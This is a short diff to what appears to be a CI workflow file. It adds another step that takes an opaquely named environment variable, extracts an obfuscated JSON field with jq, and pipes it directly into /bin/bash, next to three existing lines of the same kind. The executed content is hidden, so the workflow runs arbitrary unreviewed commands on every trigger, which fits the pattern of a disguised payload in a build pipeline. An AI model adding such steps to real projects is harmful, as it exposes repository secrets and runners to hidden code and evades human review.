@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$rch423" | jq -r .ydy02475 | /bin/bash
           printf '%s' "$ztyf6970" | jq -r .tndui11483 | /bin/bash
           printf '%s' "$fzh05875" | jq -r .zmk9181 | /bin/bash
+          printf '%s' "$a8483" | jq -r .irpr800 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
